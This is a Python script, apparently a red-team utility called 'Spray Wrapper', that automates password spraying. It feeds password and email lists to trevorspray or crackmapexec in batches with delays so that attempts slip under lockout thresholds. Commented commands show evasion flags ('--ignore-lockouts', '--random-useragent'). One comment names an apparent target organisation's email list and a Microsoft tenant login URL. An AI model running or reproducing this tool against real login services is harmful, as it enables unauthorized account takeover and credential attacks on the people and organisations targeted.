import time
import argparse
from colorama import init, Fore, Back, Style
from modules import *

def spray(url, password_file, emails_file, tool, attempts, delay, proxy):
    with open(password_file, 'r') as file:
        password_list = file.readlines()
    
    total_lines = len(password_list)
    current_line = 0
    
    while current_line < total_lines:
        for _ in range(attempts):
            password = password_list[current_line].strip()
            if current_line >= total_lines:
                break
            if tool == "trevorspray" :
                #os.system("trevorspray -u " + emails_file + " -p \"" + password_list[current_line].strip() + "\" -j 5 -f -ld 5 --delay 5 --proxy " + proxy + " --ignore-lockouts --random-useragent --url " + url)
                trevorspray.trevorspray(emails_file, password, proxy, url)
            elif tool == "crackmapexec":
                crackmapexec.cme(emails_file, password, url)
            else:
                print("Tool not found...")
                exit()
            #print("trevorspray -u kepco_valid_emails.txt -p \"" + password_list[current_line].strip() + "\" -j 5 -f -ld 5 --delay 5 --proxy http://127.0.0.1:8080 --ignore-lockouts --random-useragent --url https://login.windows.net/c02ed72e-bd0b-401b-9668-e146144b8a0c/oauth2/token")
            current_line += 1
        
        if current_line < total_lines:
            print("Sleeping for " + str(delay) + " seconds...")
            time.sleep(delay)  # Sleep for 10 minutes (600 seconds)

if __name__ == "__main__":

    banner = '''                                                     
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣄⡀⠀⠀⢀⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⣀⡄⠀⣿⣿⣿⣦⣠⣿⣿⠿⠿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⣠⣾⣿⡇⠸⣿⣿⣿⠿⠋⣁⣤⣴⣶⣶⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⣰⡟⢉⣉⣁⠀⣿⡿⠁⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀
        ⠀⠀⠀⣰⣿⡆⠸⣿⣿⣿⡿⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀
        ⠀⠀⢠⣿⣿⣿⡄⠹⣿⣿⠃⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀
        ⠀⠀⣾⡿⠉⣁⣠⣤⣽⡟⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
        ⠀⢰⣿⠁⣾⣿⣿⣿⣿⠃⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠁⠀
        ⠀⢸⣿⡄⢿⣿⣿⣿⡟⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
        ⠀⠸⣿⣷⠘⢿⣿⡿⠁⣼⣿⣿⣿⣿⠿⠟⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠙⠿⠷⠈⠛⠁⠘⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    Original Art by https://emojicombos.com/tacos-ascii-art
    Spray Wrapper tool by 3ndG4me
    Version 1.0
    '''

    print(Fore.YELLOW + banner + Style.RESET_ALL)

    parser = argparse.ArgumentParser(description="Spray Wrapper v1.0")
    parser.add_argument("-u", "--url", help="Target URL/IP/IP CIDR range to spray if tool requires it (optional).")
    parser.add_argument("-p", "--passwords", required=True, help="Password file to spray.")
    parser.add_argument("-e", "--emails", required=True, help="Emails/Usernames file to spray.")
    parser.add_argument("-t", "--tool", required=True, help="Tool to use (trevorspray/o365spray).")
    parser.add_argument("-a", "--attempts", type=int, default=2, help="The number of passwords to to try and at a time (default is 2).")
    parser.add_argument("-d", "--delay", type=int, default=300, help="The delay in seconds between each number of attempts (default is 300).")
    parser.add_argument("-x", "--proxy", help="HTTP(S) Proxy to feed to command if supported (optional)")
    args = parser.parse_args()
    
    spray(args.url, args.passwords, args.emails, args.tool, args.attempts, args.delay, args.proxy)
